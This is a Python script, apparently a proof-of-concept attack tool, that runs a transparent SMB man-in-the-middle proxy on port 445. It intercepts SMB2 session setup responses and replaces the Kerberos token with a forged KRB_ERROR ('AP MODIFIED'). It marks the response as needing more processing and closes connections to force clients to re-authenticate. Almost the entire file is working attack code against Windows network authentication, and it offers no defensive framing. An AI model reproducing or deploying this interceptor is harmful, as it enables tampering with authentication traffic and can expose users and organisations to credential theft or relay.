#!/usr/bin/env python3
from scapy.layers.kerberos import (
    Kerberos,
    KRB_AS_REQ,
    KRB_AS_REP,
    KRB_ERROR,
    KRB_KDC_REQ_BODY,
    KRB_AP_REP,
    KRB_AP_REQ,
    KRB_TGS_REP,
    KRB_TGS_REQ,
    KerberosTCPHeader,
    KRB_InnerToken,
    PrincipalName
)
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.netbios import NBTSession
from scapy.layers.smb2 import (
    SMB2_Session_Setup_Response,
    SMB2_Header,
    SMB2_Session_Setup_Request,
)
from scapy.layers.spnego import SPNEGO_negTokenResp, SPNEGO_negToken
from scapy.asn1.asn1 import ASN1_INTEGER, ASN1_ENUMERATED, ASN1_GENERAL_STRING, ASN1_STRING
from scapy.all import sniff, TCP, send, Raw
from scapy.all import *
from netfilterqueue import NetfilterQueue
import traceback
import socket
import threading
import select
import struct
import time

CYAN = "\033[96m"
YELLOW = "\033[93m"
NORMAL = "\033[0m"

LISTEN_PORT = 445
BUFFER_SIZE = 4096

SO_ORIGINAL_DST = 80

global last_time_session_setup_response_poisonned
last_time_session_setup_response_poisonned: dict = {}

global last_time_smb_socket_closed
last_time_smb_socket_closed: dict = {}


def get_original_dst(sock):
    """
    Returns (ip, port) of the original destination.
    """
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, raw_ip = struct.unpack("!HH4s8x", data)
    ip = socket.inet_ntoa(raw_ip)
    return ip, port


def handlePacketFromClient(data, server_sock):
    try:

        pkt = NBTSession(data)

        print("pkt from client", pkt.summary())
        # pkt.show2()

        if pkt.haslayer(SMB2_Session_Setup_Request):
            data = bytes(handle_SMB2_Session_Setup_Request(pkt))

        server_sock.sendall(data)
    except Exception as e:
        print("[x] Error while handling packet from client:", e)
        traceback.print_exc()
        server_sock.sendall(data)


def handlePacketFromServer(data, client_sock):
    try:
        pkt = NBTSession(data)

        print("pkt from server", pkt.summary())
        # pkt.show2()

        src_ip, src_port = client_sock.getpeername()
        now = time.time()

        if pkt.haslayer(SMB2_Session_Setup_Response):
            if handle_SMB2_Session_Setup_Response(pkt, client_sock):
                return
        elif (pkt[SMB2_Header].Command > 0
              and (src_ip not in last_time_smb_socket_closed or
                   abs(last_time_smb_socket_closed[src_ip] - now) > 60)):
            last_time_smb_socket_closed[src_ip] = now
            client_sock.close()
            return

        client_sock.sendall(data)
    except Exception as e:
        print("[x] Error while handling packet from client:", e)
        traceback.print_exc()
        client_sock.sendall(data)


def handle_SMB2_Session_Setup_Request(pkt):
    return pkt


def handle_SMB2_Session_Setup_Response(pkt, client_sock):
    global last_time_session_setup_response_poisonned

    src_ip, src_port = client_sock.getpeername()
    now = time.time()

    if (
        src_ip in last_time_session_setup_response_poisonned
        and abs(last_time_session_setup_response_poisonned[src_ip] - now) < 10
    ):
        return False
    else:
        last_time_session_setup_response_poisonned[src_ip] = now

    header = pkt[SMB2_Header]
    header.Status = 3221225494  # MORE_PROCESSING_REQUIRED

    response = pkt[SMB2_Session_Setup_Response]
    krb_innertoken = response.Buffer[0][1].token.responseToken.value.root.innerToken
    # krb_innertoken.show()

    # errorCode = 33  # ??? NYV
    errorCode = 41  # ??? AP MODIFIED
    print("sending error code", errorCode)
    err = KRB_ERROR(
        errorCode=ASN1_INTEGER(errorCode),
        realm=ASN1_GENERAL_STRING("TOTOTUTU.LOCAL"),
        sname=PrincipalName.fromSPN('LDAP/TOTOTUTU.LOCAL')
    )

    krb_innertoken.root = err
    krb_innertoken.TOK_ID = b"\x03"

    response.SecurityLen = len(response.Buffer[0][1])
    response.Buffer[0][1].token.negState = ASN1_ENUMERATED(1)  # accept incomplete
    pkt.LENGTH = len(pkt[SMB2_Header])

    client_sock.sendall(bytes(pkt))
    client_sock.close()

    # pkt.show()
    # return pkt
    return True


def proxy_connection(client_sock):
    try:
        dst_ip, dst_port = get_original_dst(client_sock)
    except Exception as e:
        print(f"[!] Failed to get original dst: {e}")
        client_sock.close()
        return

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((dst_ip, dst_port))
    except Exception as e:
        print(f"[!] Failed to connect to server {dst_ip}:{dst_port}: {e}")
        client_sock.close()
        return

    sockets = [client_sock, server_sock]

    try:
        while True:
            readable, _, _ = select.select(sockets, [], [])
            for s in readable:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    return

                if s is client_sock:
                    handlePacketFromClient(data, server_sock)
                else:
                    handlePacketFromServer(data, client_sock)
    finally:
        client_sock.close()
        server_sock.close()


def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(("0.0.0.0", LISTEN_PORT))
    listen_sock.listen()

    print(f"[+] SMB MITM listening on port {LISTEN_PORT}")

    while True:
        client_sock, addr = listen_sock.accept()
        t = threading.Thread(target=proxy_connection, args=(client_sock,), daemon=True)
        t.start()


if __name__ == "__main__":
    main()
